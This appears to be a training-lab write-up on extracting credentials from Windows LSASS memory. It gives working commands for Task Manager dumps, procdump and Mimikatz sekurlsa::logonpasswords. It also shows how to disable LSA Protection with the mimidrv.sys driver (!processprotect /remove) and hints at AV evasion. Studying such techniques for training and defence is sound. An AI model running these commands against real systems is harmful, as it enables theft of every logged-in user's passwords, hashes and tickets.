# LAB — Extracting Credentials From LSASS

> [!abstract] TL;DR
> **LSASS** stores NTLM hashes, cleartext passwords, and Kerberos tickets for all logged-in users in protected memory. With admin/SYSTEM you can dump it three ways: **Task Manager GUI**, **Sysinternals `procdump`**, or **Mimikatz `sekurlsa::logonpasswords`**. Since 2012, **Protected Process Light (PPL)** blocks access — defeat it with the Mimikatz kernel driver **`mimidrv.sys`** (`!+` then `!processprotect /process:lsass.exe /remove`).
> MITRE: *OS Credential Dumping: LSASS Memory* ([T1003.001](https://attack.mitre.org/techniques/T1003/001/)).

---

## What Is LSASS?

**Local Security Authority Subsystem Service (LSASS)** is a Windows process that enforces the OS security policy. It verifies logged-in accounts and manages passwords, hashes, and Kerberos tickets. Credentials are cached in LSASS so users can reach network resources (file shares, SharePoint, services) without re-entering credentials — i.e. to support **Single Sign-On (SSO)**.

This makes LSASS a **prime target**: all active user credentials, passwords, and Kerberos tickets reside in its memory. With admin privileges you can dump the process memory and compromise every user account on the system.

> [!warning] Prerequisite
> LSASS runs as **SYSTEM**. You need **SYSTEM or local administrator** privileges to dump it. Also, to get a victim's hash, that user **must have logged in** so their credentials are cached in memory.

## Method 1 — Task Manager GUI

Open **Task Manager as administrator** → **Details** tab → find **`lsass.exe`** (Local Security Authority Process) → right-click → **Create dump file**. This dumps the entire process memory to disk.

![[Pasted image 20261014143659.png]]

Once finished, a pop-up shows the dump path. Copy the file and transfer it to the AttackBox to extract NTLM hashes offline.

> [!danger] `Access is denied` error
> The first attempt fails with **`Access is denied`** because **PPL (Protected Process Light)** protects LSASS. You must disable the protection first (see Mimikatz section).

Copy the dumped file to the Mimikatz folder for processing:

```markup
C:\Users\Administrator>copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
        1 file(s) copied.
```

## Method 2 — Sysinternals `procdump` (no GUI)

`procdump` is a Sysinternals command-line process-dump utility. On the lab VM: `c:\Tools\SysinternalsSuite`.

```markup
c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

[09:09:33] Dump 1 writing: Estimated dump file size is 162 MB.

```

- **`-accepteula`** — accept the EULA
- **`-ma`** — full memory dump of the process

> [!warning] AV detection
> Dumping LSASS is a known adversary technique, so AV products may flag it as malicious. In the real world you may need to encrypt the dump or implement an AV-bypass method.

## Method 3 — Mimikatz (most reliable)

**Mimikatz** extracts passwords, hashes, PINs, and Kerberos tickets from memory, and enables Pass-the-Hash, Pass-the-Ticket, and Golden Ticket attacks. It requires admin/SYSTEM privileges.

Run cmd **as administrator**, then launch Mimikatz:

```
cd C:\Tools\Mimikatz
.\mimikatz.exe
```

Enable debug privileges (grants `SeDebugPrivilege` for memory access):

```
mimikatz # privilege::debug
Privilege '20' OK
```

Dump all cached passwords/hashes/tickets from `lsass.exe`:

```
mimikatz # sekurlsa::logonpasswords
```

## Protected LSASS (PPL) & the Mimikatz Kernel Driver

Since 2012 (Windows Server 2012 / Windows 8.1), Microsoft added **LSA Protection (Protected Process Light, PPL)** over LSASS, blocking admins from inspecting/modifying its memory via user-mode interfaces.

LSA protection is controlled by the **`RunAsPPL`** DWORD at:

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```

- `RunAsPPL = 1` → protection enabled
- `RunAsPPL = 0` → protection disabled

> [!note] Registry edit is unreliable
> Setting `RunAsPPL` to `0` in `regedit` often does not take effect immediately and may need a process/system restart. The Task Manager dump still returns `Access is denied` after the edit.

With PPL enabled, `sekurlsa::logonpasswords` fails with:

```markup
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

`0x00000005` = Access Denied.

### Fix: load `mimidrv.sys` and strip protection

Mimikatz ships a kernel driver (**`mimidrv.sys`**) that disables LSA protection at the driver level. If you hit the handle error, download `mimidrv.sys` and `mimilib.dll` into the **same folder** as `mimikatz.exe` (from <https://github.com/ParrotSec/mimikatz/tree/master/x64>).

Register and start the driver:

```markup
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

> [!tip] `isFileExist` error
> If `!+` fails with an `isFileExist` error, exit Mimikatz, `cd C:\Tools\Mimikatz\`, and run it again from there.

Remove PPL protection from LSASS:

```markup
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```

Now `sekurlsa::logonpasswords` runs successfully — and **Task Manager → Create dump file** also works.

> [!note] Command variants seen in the material
> Both `!processprotect /process:lsass.exe /remove` (official) and `!process /protect:lsass.exe /remove` (transcript) appear; use the `!processprotect` form.

## Locating the Memory Dump

After enabling the dump, Task Manager writes the file here:

```
C:\Users\THM\AppData\Local\Temp\lsass.DMP
```

`AppData` is hidden by default — enable **Hidden items** in Explorer to browse it. Verify from cmd:

```
cd C:\Users\thm\AppData\Local\Temp\
dir
```

## Red-Team Toolkit Checklist

To reliably harvest from LSASS on modern protected Windows, your `Tools\x64` directory should contain **all three** components:

1. **`mimidrv.sys`** — kernel-mode driver (defeats PPL)
2. Associated **library files** (`.lib` / `mimilib.dll`)
3. **`mimikatz.exe`** — the user-mode executable

> [!tip] Common field mistake
> Many operators carry only the standalone `mimikatz.exe` and get stuck on `Access is denied` / `Handle on memory` errors when PPL is enforced. Always pack `mimidrv.sys` too — it's in the official Mimikatz GitHub repo.
